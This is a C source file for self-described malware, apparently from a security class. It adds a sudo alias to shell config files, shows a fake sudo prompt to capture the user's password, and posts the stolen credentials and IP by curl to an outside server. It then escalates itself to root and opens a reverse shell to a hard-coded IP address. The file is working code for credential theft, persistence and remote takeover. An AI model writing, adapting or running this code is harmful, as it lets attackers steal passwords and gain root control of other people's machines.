#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>
#include "pseudo.h"
#include <signal.h>
#include <assert.h>
#include <time.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PASSWD_SIZE 1024
#define UNAME_SIZE 1024

static void sighandler(int signo){}

static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};

int main(int argc, char ** argv){

  //set mode
  int mode = P_IMPLANT;
  for (int i = 0; i<argc; i++){
    if (strcmp(argv[i],"SUDO") == 0){
      mode = P_SUDO;
      break;
    }
    if (strcmp(argv[i],"ROOT")==0){
      mode = P_ROOT;
      break;
    }
  }

  //implant the alias to the virus as sudo...
  if(mode == P_IMPLANT){
    alias_virus();
  }

  //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
  if(mode == P_SUDO){
    char passwd[PASSWD_SIZE];
    char username[UNAME_SIZE];

    steal_password(passwd, username);

    printf("%s's password is %s\n", username, passwd);

    send_stolen_data(username, passwd);

    char ** cmd_ray = make_execvp_args(argc, argv);
    runSudo(passwd, cmd_ray, 0);
    free_execvp_ray(cmd_ray);

    char escaped_path[2048] = "";
    get_virus_name(escaped_path);
    char *escalate_vector[5] = {"/bin/sudo", "-S", escaped_path, "ROOT", NULL};

    printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
    runSudo(passwd, escalate_vector, 0);
  }

  if(mode == P_ROOT){
    printf("I have root acess now...\n");
    reverse_shell(9845, "206.189.197.67");
    while(1){
      sleep(1);
      printf("...\n");
    }
  }
  return 0;

}

void free_execvp_ray(char ** cmd_ray){
  free(cmd_ray[0]);
  free(cmd_ray[1]);
  free(cmd_ray);
}

int get_username(char * uname){
  uid_t uid = getuid();
  struct passwd *pw = getpwuid(uid);
  strcpy(uname, pw -> pw_name);

  return 0;
}

int steal_password(char * passwd, char * username){

  char * clear_sudo_session[3] = {"/bin/sudo", "-k", NULL};
  runSudo("", clear_sudo_session, 1);

  get_username(username);

  char prompt[UNAME_SIZE + 32];
  int correctPasswd = 0;
  char * returned_pass;
  while (! correctPasswd){
    sprintf(prompt,"VIRUS [sudo] password for %s: ", username);

    // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
    returned_pass = getpass(prompt);

    // returned_pass[strlen(returned_pass)] = 0;

    strcpy(passwd, returned_pass);

    // If sudo works with password, we know we have the right password
    if (testSudoPassword(passwd) == 0){
      correctPasswd = 1;
    }

  }

  free(returned_pass);

  return 0;
}

int get_virus_name(char * escaped_path){
  //get the path to the virus
  char path_to_this_exe[1024] = "";
  readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));

  memset(escaped_path, 0, 2048);
  for (int i = 0; i < strlen(path_to_this_exe); i++) {
      if (path_to_this_exe[i] == ' ') {
          strcat(escaped_path, "\\ ");
      } else {
          strncat(escaped_path, &path_to_this_exe[i], 1);
      }
  }

}

void send_stolen_data(char *username, char *password) {


  // Copied from here: https://stackoverflow.com/a/65382305

  //popen opens a pipe to the child process. In r mode it returns a FILE * to stdout of the process

  FILE* file = popen("curl -s https://api.ipify.org", "r");
  char out = 0;
  size_t outlen = 0;

  char ip[256] = "";
  int i = 0;
  while (read(fileno(file), &out, 1) > 0) {
      // printf("%c\n", out);
      ip[i] = out;
      i++;
  }

  pclose(file);
  // free(out);

  char command[1024];
  // Create the full curl POST request
  snprintf(command, sizeof(command),
           "bash -c 'curl -X POST -d \"username=%s&password=%s&ip=%s&timestamp=$(date)\" https://cyber.stanleyhoo1.tech/steal'",
           username, password, ip);

  // Run the command
  system(command);
}

int alias_virus(){
  //get the home dir
  char * home_dir_path= getenv("HOME");

  char escaped_path[2048] = "";

  get_virus_name(escaped_path);


  //prepare the alias
  char alias[4096] = "alias sudo=\"";
  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", escaped_path);

  for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
    append_virus(home_dir_path, CONFIGS[i], alias);
  }

  return 0;

}

int append_virus(char * home_dir, char * config_file, char * alias){
  char buffer[1024] = "";

  strcpy(buffer, home_dir);
  strcat(buffer, config_file);

  printf("%s\n", buffer);

  int fd = open(buffer, O_WRONLY|O_CREAT, 0644);
  if(fd < 0){
    perror("no file exists");
    return -1;
  }


  lseek(fd, 0, SEEK_END);
  write(fd, alias, strlen(alias));
  write(fd,"\n",strlen("\n"));


  close(fd);

  return 0;

}


int testSudoPassword(char * passwd){
  // The first three command line arguments are path to file, SUDO, sudo
  char * fillerArray[] = {"/bin/sudo", "-S", "ls", NULL};
  //printf("%s\n", *(fillerArray));

  return runSudo(passwd, fillerArray, 1);

}

char ** make_execvp_args(int argc, char ** argv){
  char ** execvp_args = malloc(sizeof(char *) * argc);

  char * sudo = malloc(strlen("sudo")*sizeof(char)+1);
  strcpy(sudo, "sudo");

  char * S = malloc(strlen("-S")*sizeof(char) + 1);
  strcpy(S, "-S");

  execvp_args[0] = sudo;
  execvp_args[1] = S;

  for (int i = 2; i<argc-1; i++){
    execvp_args[i] = argv[i+1];
  }

  execvp_args[argc-1] = NULL;

  return execvp_args;
}

// Runs sudo with given arguments and returns 0 if successful, something else if not
int runSudo(char * passwd, char ** argAry, int mask_output){
  // Creating pipe for parent and sudo child to communicate
  // For parent to give sudo password as stdin
  int fds[2];
  pipe(fds);

  int readPipe = fds[0];
  int writePipe = fds[1];

  int forkResult = fork();

  // Parent waits for child, returns result of child's sudo
  if (forkResult > 0){//PARENT
    close(readPipe);
    // Writing password to sudo
    int writeResult = write(writePipe, passwd, strlen(passwd));

    //press enter on the sudo
    char nl = '\n';
    write(writePipe, &nl, 1);
    write(writePipe, &nl, 1);
    write(writePipe, &nl, 1);


    if (writeResult == -1){
      printf("Failed to write password to sudo\n");
      return -1;
    }

    // Waiting for sudo to complete
    int status = 0;
    wait(&status);

    int result = WEXITSTATUS(status);

    return result;
  }

  // Child runs sudo
  if (forkResult == 0){
    close(writePipe);

    int newStdErr = dup(fileno(stderr));
    int blackHole = open("/dev/null", O_WRONLY, 0);
    dup2(blackHole, fileno(stderr));

    if(mask_output){
      //if we are masking the output of sudo then we put stdout to blackhole
      dup2(blackHole, fileno(stdout));
    }

    int newStdIn = dup(fileno(stdin));
    dup2(readPipe, fileno(stdin));

    //debug zone
    //end debug zone

    int execResult = execvp(argAry[0], argAry);
    if (execResult == -1){
      perror("Execvp failed to run sudo\n");
    }
    exit(1);
  }

  // Unreachable
  return 0;
}


//c reverse shell slighlty modified from https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#dart
// from class notes
int reverse_shell(int port, char*ip){
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
